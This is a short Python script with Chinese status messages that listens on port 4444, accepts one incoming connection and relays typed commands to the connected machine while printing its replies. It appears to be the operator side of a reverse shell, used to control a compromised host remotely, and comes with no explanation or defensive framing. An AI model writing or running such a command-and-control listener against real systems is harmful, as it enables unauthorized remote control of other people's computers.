import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(1)
print("[*] 等待连接...")
conn, addr = s.accept()
print(f"[+] 已连接: {addr}")

while True:
    output = conn.recv(4096)
    if output:
        print(output.decode(), end='')

    cmd = input("> ")
    if cmd.lower() == "exit":
        conn.send(b"exit")
        break
    conn.send(cmd.encode() + b"\n")
